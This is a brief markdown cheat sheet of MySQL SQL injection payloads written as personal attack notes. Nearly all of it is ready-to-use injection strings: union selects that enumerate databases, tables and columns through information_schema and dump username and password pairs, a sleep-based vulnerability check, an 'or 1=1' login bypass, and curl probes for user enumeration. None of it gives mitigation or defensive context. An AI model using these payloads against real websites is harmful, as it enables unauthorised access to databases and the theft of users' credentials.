# SQL Injection

## MySQL Injection

**url/users.php?id=2' order by 10#** -check how many columns are in db. # is used to comment the final ' in the sql query, can use also '-- -'

**url/users.php?id=2' union select 10#** -show all the columns, the number has to be the exacts columns

**url/users.php?id=non-existing-user-444' union select database()#** -injection starts, it will show you the data base entered in the query

**url/users.php?id=non-existing-user-444' union select group_concat(schema_name) from information_schema.schemata#** -list all existing databases

**url/users.php?id=non-existing-user-444' union select group_concat(table_name) from information_schema.tables where table_schema='database'#** -list tables from database

**url/users.php?id=non-existing-user-444' union select group_concat(column_name) from information_schema.columns where table_schema='database' and table_name='users'#** -list columns from table database

**url/users.php?id=non-existing-user-444' union select group_concat(username,'0x3a',password) from database.users#** -list users from users column from database, 0x3a is ':' in hex


### checker

**url/users.php?id=non-existing-user-444' and sleep(5)#** -check if it is sql injection vulnerable 

**url/users.php?id=non-existing-user-444' or 1=1#** - used in poor webs login field, it will check 1=1 and since it's true, you can log in

**curl -s -X GET "url/users.php?id=-1" -I** -  used when you can't see response in the browser, then in shell check if user exists or not; if gives 404 Not found doesn't exists, if gives 200 OK probably exists

**curl -s -I -X GET "url/users.php" -G --data-urlencode "id=1"** - check if user exists easy way
